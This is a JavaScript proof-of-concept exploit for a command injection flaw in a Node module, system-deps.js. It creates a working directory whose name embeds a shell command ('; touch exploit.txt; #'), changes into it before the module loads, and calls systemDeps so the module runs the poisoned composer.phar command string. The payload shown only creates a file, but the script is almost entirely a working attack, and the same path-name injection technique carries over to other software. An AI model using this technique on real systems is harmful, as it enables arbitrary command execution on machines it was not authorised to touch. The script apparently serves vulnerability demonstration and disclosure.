'use strict';

//
// Exploit demo for a command injection vulnerability in system-deps.js
//
// Disclaimer: This code is provided for educational purposes only. Use
// it only in a controlled environment and never on systems for which you do not have permission.
//
// The idea is to force the module’s computed pharCmd to include an injected payload.
// Because the module computes pharCmd at load time using path.resolve(), if you change
// the working directory to a specially crafted directory name, then the resulting command
// string will include your payload.
//
// In our demo the injected working directory name contains a semicolon followed by a shell
// command that creates a file named "exploit.txt" in the current directory.
//

const fs = require('fs');
const process = require('process');
const path = require('path');

// --- Step 1. Prepare a malicious working directory ---
//
// By creating a directory whose name contains shell metacharacters, we can affect the
// computed value of pharCmd. In this case, the directory name is chosen so that when used
// by path.resolve() it will inject a command via a semicolon.
// For example, if the absolute path of the directory becomes:
//   /home/attacker/injected; touch exploit.txt; #
// then later the command constructed as:
//   php /home/attacker/injected; touch exploit.txt; #/composer.phar show -p --format=json
// is interpreted by the shell as two commands (the second one being "touch exploit.txt").
//
const maliciousDir = './injected; touch exploit.txt; #';

// Create the directory if it doesn't exist.
if (!fs.existsSync(maliciousDir)) {
  fs.mkdirSync(maliciousDir, { recursive: true });
}

// --- Step 2. Change the process’s working directory BEFORE loading the module ---
//
// Since the vulnerable module computes its command strings at load time using path.resolve()
// (which uses process.cwd()), the current directory must be set to our malicious directory.
process.chdir(maliciousDir);
console.log('Changed working directory to:', process.cwd());

// --- Step 3. Load the vulnerable module ---
//
// Note that because we have already changed the working directory, the constant pharCmd will
// now incorporate our injected payload.
const { systemDeps } = require('./vulnerable_slice');  // The module exports only systemDeps

// --- Step 4. Invoke the exported function using options that force the vulnerable branch ---
//
// Passing { composerIsFine: false, composerPharIsFine: true } ensures that the module does not
// take the "composer show" branch and instead goes into the branch that executes pharCmd.
try {
  const deps = systemDeps(process.cwd(), { composerIsFine: false, composerPharIsFine: true });
  console.log('System dependencies reported:', deps);
} catch (err) {
  console.error('Error executing systemDeps:', err);
}

